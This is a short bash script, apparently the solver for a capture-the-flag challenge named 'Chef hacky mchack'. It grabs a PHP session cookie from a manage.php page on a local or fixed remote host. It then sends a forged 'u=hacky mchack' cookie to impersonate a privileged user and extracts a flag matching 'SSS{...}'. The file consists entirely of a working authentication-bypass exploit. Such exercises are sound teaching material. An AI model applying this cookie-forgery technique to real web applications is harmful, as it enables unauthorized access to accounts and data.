#!/bin/bash
PORT=8087

if [[ $1 == "local" ]]
then
    url='http://127.0.0.1:'$PORT
elif [[ $1 == "remote" ]] && [[ -z $2 ]] 
then
    url='http://141.85.224.157:'$PORT
else
    url=$1':'$2
fi

# Chef hacky mchack
echo "Start exploit for Chef hacky mchack"
url=$url'/manage.php'
curl -s -c cookies.txt -o /dev/null $url
phpsessid=$(cat cookies.txt | grep PHPSESSID | awk '{print $7}')
flag=$(curl -s -b 'PHPSESSID='$phpsessid';u=hacky mchack' $url | grep -o "SSS{.*}")
echo "Flag is $flag"
echo "----------------------------"
